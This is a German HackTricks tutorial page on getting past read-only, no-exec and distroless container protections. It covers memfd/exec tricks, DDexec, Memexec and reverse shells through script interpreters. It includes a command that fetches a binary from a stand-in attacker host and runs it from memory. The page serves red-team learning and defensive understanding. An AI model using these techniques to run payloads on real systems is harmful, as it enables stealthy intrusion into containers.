# Umgehung von FS-Schutzmaßnahmen: Nur-Lesen / Keine Ausführung / Distroless

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Videos

In den folgenden Videos finden Sie die auf dieser Seite erwähnten Techniken ausführlicher erklärt:

* [**DEF CON 31 - Erforschung der Linux-Speicher-Manipulation für Stealth und Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stealth-Eindringungen mit DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Nur-Lesen / Keine Ausführung Szenario

Es ist immer häufiger, Linux-Maschinen mit **Nur-Lesen (ro) Dateisystemschutz** zu finden, insbesondere in Containern. Dies liegt daran, dass das Ausführen eines Containers mit einem ro-Dateisystem so einfach ist wie das Festlegen von **`readOnlyRootFilesystem: true`** im `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Auch wenn das Dateisystem als ro eingebunden ist, ist **`/dev/shm`** immer noch beschreibbar, daher können wir nichts auf die Festplatte schreiben. Dieser Ordner wird jedoch mit **Keine Ausführung-Schutz** eingebunden, sodass Sie, wenn Sie hier eine Binärdatei herunterladen, sie **nicht ausführen können**.

{% hint style="warning" %}
Aus Sicht des Red Teams wird es dadurch **kompliziert, Binärdateien herunterzuladen und auszuführen**, die nicht bereits im System vorhanden sind (wie Backdoors oder Enumeratoren wie `kubectl`).
{% endhint %}

## Einfachste Umgehung: Skripte

Beachten Sie, dass ich von Binärdateien gesprochen habe, Sie können jedoch **jedes Skript ausführen**, solange der Interpreter auf der Maschine vorhanden ist, wie ein **Shell-Skript**, wenn `sh` vorhanden ist, oder ein **Python-Skript**, wenn `python` installiert ist.

Dies reicht jedoch nicht aus, um Ihre Binärdatei-Backdoor oder andere Binärwerkzeuge auszuführen, die Sie möglicherweise ausführen müssen.

## Umgehung des Speichers

Wenn Sie eine Binärdatei ausführen möchten, das Dateisystem dies jedoch nicht zulässt, ist der beste Weg, dies zu tun, indem Sie es aus dem **Speicher heraus ausführen**, da die **Schutzmaßnahmen dort nicht gelten**.

### FD + exec-Syscall-Umgehung

Wenn Sie leistungsstarke Skript-Engines auf der Maschine haben, wie **Python**, **Perl** oder **Ruby**, können Sie die Binärdatei zum Ausführen aus dem Speicher herunterladen, in einem Speicher-Dateideskriptor (`create_memfd`-Syscall) speichern, der nicht durch diese Schutzmaßnahmen geschützt wird, und dann einen **`exec`-Syscall** aufrufen, wobei der **fd als auszuführende Datei** angegeben wird.

Hierfür können Sie das Projekt [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) verwenden. Sie können ihm eine Binärdatei übergeben und es wird ein Skript in der angegebenen Sprache generieren, in dem die Binärdatei mit den Anweisungen zum **Decodieren und Dekomprimieren** in einem mit `create_memfd`-Syscall erstellten **fd** **komprimiert und b64-codiert** wird und ein Aufruf des **exec**-Syscalls zum Ausführen.

{% hint style="warning" %}
Dies funktioniert nicht in anderen Skriptsprachen wie PHP oder Node, da sie keine **Standardmethode zum Aufrufen von Roh-Syscalls** aus einem Skript haben. Daher ist es nicht möglich, `create_memfd` aufzurufen, um den **Speicher-Dateideskriptor** zum Speichern der Binärdatei zu erstellen.

Darüber hinaus funktioniert das Erstellen eines **regulären Dateideskriptors** mit einer Datei in `/dev/shm` nicht, da Sie sie nicht ausführen dürfen, da der **Keine Ausführung-Schutz** angewendet wird.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ist eine Technik, mit der Sie den Speicher Ihres eigenen Prozesses überschreiben können, indem Sie seinen **`/proc/self/mem`** überschreiben.

Daher können Sie, indem Sie den vom Prozess ausgeführten Assemblercode kontrollieren, einen **Shellcode** schreiben und den Prozess "mutieren", um **beliebigen Code** auszuführen.

{% hint style="success" %}
**DDexec / EverythingExec** ermöglicht das Laden und **Ausführen** Ihres eigenen **Shellcodes** oder **beliebiger Binärdateien** aus dem **Speicher**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Für weitere Informationen zu dieser Technik besuchen Sie Github oder:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ist der natürliche nächste Schritt von DDexec. Es handelt sich um einen **DDexec-Shellcode-Dämon**, sodass Sie jedes Mal, wenn Sie eine andere Binärdatei ausführen möchten, DDexec nicht neu starten müssen. Sie können einfach den Memexec-Shellcode über die DDexec-Technik ausführen und dann **mit diesem Dämon kommunizieren, um neue Binärdateien zum Laden und Ausführen zu übergeben**.

Ein Beispiel, wie Sie **Memexec verwenden, um Binärdateien von einer PHP-Reverse-Shell auszuführen**, finden Sie unter [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Mit einem ähnlichen Zweck wie DDexec ermöglicht die Technik [**Memdlopen**](https://github.com/arget13/memdlopen) eine einfachere Möglichkeit, Binärdateien im Speicher zu laden, um sie später auszuführen. Es könnte sogar ermöglichen, Binärdateien mit Abhängigkeiten zu laden.

## Distroless-Bypass

### Was ist Distroless

Distroless-Container enthalten nur die **minimalen Komponenten, die zum Ausführen einer bestimmten Anwendung oder eines bestimmten Dienstes erforderlich sind**, wie Bibliotheken und Laufzeitabhängigkeiten, aber größere Komponenten wie ein Paketmanager, eine Shell oder Systemdienstprogramme sind ausgeschlossen.

Das Ziel von Distroless-Containern besteht darin, die Angriffsfläche von Containern zu **verkleinern, indem unnötige Komponenten eliminiert** und die Anzahl der ausnutzbaren Schwachstellen minimiert werden.

### Reverse-Shell

In einem Distroless-Container finden Sie möglicherweise **nicht einmal `sh` oder `bash`**, um eine normale Shell zu erhalten. Sie finden auch keine Binärdateien wie `ls`, `whoami`, `id`... alles, was Sie normalerweise in einem System ausführen.

{% hint style="warning" %}
Daher können Sie keine **Reverse-Shell** erhalten oder das System wie gewohnt **enumerieren**.
{% endhint %}

Wenn der kompromittierte Container beispielsweise eine Flask-Webanwendung ausführt, ist Python installiert und Sie können eine **Python-Reverse-Shell** erhalten. Wenn Node ausgeführt wird, können Sie eine Node-Rev-Shell erhalten, und dasselbe gilt für fast jede **Skriptsprache**.

{% hint style="success" %}
Mit der Skriptsprache können Sie das System mithilfe der Sprachfunktionen **enumerieren**.
{% endhint %}

Wenn **kein `read-only/no-exec`-Schutz** vorhanden ist, können Sie Ihre Reverse-Shell missbrauchen, um Ihre Binärdateien im Dateisystem zu **schreiben** und **auszuführen**.

{% hint style="success" %}
In dieser Art von Containern werden diese Schutzmaßnahmen jedoch in der Regel vorhanden sein, aber Sie können die **vorherigen Speicherausführungstechniken verwenden, um sie zu umgehen**.
{% endhint %}

Beispiele, wie Sie einige RCE-Schwachstellen ausnutzen können, um Skriptsprachen-**Reverse-Shells** zu erhalten und Binärdateien aus dem Speicher auszuführen, finden Sie unter [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen** möchten, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden**.

</details>
